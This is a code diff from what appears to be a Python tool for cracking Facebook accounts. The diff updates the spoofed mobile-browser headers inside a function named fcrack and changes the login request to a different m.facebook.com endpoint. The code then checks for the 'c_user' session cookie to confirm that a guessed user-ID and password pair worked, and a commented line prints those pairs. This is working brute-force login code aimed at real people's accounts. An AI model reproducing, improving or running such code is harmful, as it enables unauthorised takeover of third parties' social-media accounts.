@@ -1469,42 +1469,36 @@ def fcrack(uid,pwx,tl):
             "login":"Log In"}
             header_freefb = {'authority': 'm.facebook.com',
 
-			'upgrade-insecure-requests': '1',
+            'method': 'path',
 
-			'viewport-width': '980',
+            'scheme': 'https',
 
-			'method': 'path',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
 
-			'scheme': 'https',
+            'accept-language': 'en-US,en;q=0.9',
 
-			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'cache-control': 'max-age=0',
 
-			'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8', 
+            'referer': 'https://m.facebook.com/?stype=lo&jlou=AffoF9aAaDCD7hg93qfp3AQSX19iTPG6TUIgYB6HBUfAxIcnAYdQRSuNEVQf6rb7rKiZ9rNWSZkrzs_CXCFVDkB11qg3vvbfaPd4YXZtkks6Jw&smuh=60803&lh=Ac8vBlLKWJaHl2JdWxc&ref=wizard&_rdr',
 
-			'dnt':'1', 
+            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
 
-			'x-requested-with':'mark.via.gp', 
+            'sec-ch-ua-mobile': '?1',
 
-			'sec-fetch-site': 'none',
+            'sec-ch-ua-platform': '"Android"',
 
-			'sec-fetch-mode': 'navigate',
+            'sec-fetch-dest': 'document',
 
-			'sec-fetch-user': '?1',
+            'sec-fetch-mode': 'navigate',
 
-			'sec-fetch-dest': 'document',
+            'sec-fetch-site': 'same-origin',
 
-			'accept-encoding':'gzip, deflate, br','accept-language': 'en-US,en;q=0.9',
+            'sec-fetch-user': '?1',
 
-			'cache-control': 'max-age=0',
+            'upgrade-insecure-requests': '1',
 
-			'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
-
-			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
-
-			"sec-ch-prefers-color-scheme": "light",
-
-			'user-agent': pro}
-            lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+            'user-agent': pro}
+            lo = session.post('https://m.facebook.com/login/?next&ref=wizard&fl&login_from_aymh=1&refid=8',cookies=cookies,headers=headers).text
             log_cookies=session.cookies.get_dict().keys()
             #print(iid+'|'+pws+'|'+str(log_cookies))
             if 'c_user' in log_cookies:
